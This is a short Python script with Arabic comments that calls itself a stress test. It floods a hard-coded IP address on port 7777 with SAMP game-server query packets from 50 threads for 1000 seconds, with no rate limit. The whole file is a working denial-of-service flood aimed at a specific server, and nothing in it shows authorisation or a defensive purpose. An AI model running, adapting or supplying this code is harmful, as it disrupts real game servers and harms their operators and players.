import socket
import concurrent.futures
import time

TARGET_IP = "170.62.202.93"
TARGET_PORT = 7777
DURATION = 1000  # مدة الاختبار بالثواني
THREADS = 50   # عدد الخيوط المتزامنة للضغط بشكل ذكي

def send_smart_query():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.settimeout(1.0)
    
    ip_bytes = bytes(map(int, TARGET_IP.split('.')))
    port_bytes = int(TARGET_PORT).to_bytes(2, 'little')
    
    # أنواع استعلامات SAMP المختلفة ('i' للمعلومات، 'r' للقواعد، 'c' للعملاء)
    query_types = [b'i', b'r', b'c', b'd']
    
    end_time = time.time() + DURATION
    count = 0
    
    while time.time() < end_time:
        for q in query_types:
            try:
                payload = b'SAMP' + ip_bytes + port_bytes + q
                client.sendto(payload, (TARGET_IP, TARGET_PORT))
                count += 1
            except Exception:
                pass
    client.close()
    return count

def run_test():
    print(f"[*] بدء الاختبار الذكي على {TARGET_IP}:{TARGET_PORT} باستخدام {THREADS} مسارات...")
    start_time = time.time()
    
    total_packets = 0
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(send_smart_query) for _ in range(THREADS)]
        for future in concurrent.futures.as_completed(futures):
            total_packets += future.result()
            
    elapsed = time.time() - start_time
    print(f"[+] انتهى الاختبار. تم إرسال نحو {total_packets} حزمة استعلام منظمة خلال {elapsed:.2f} ثانية.")

if __name__ == "__main__":
    run_test()
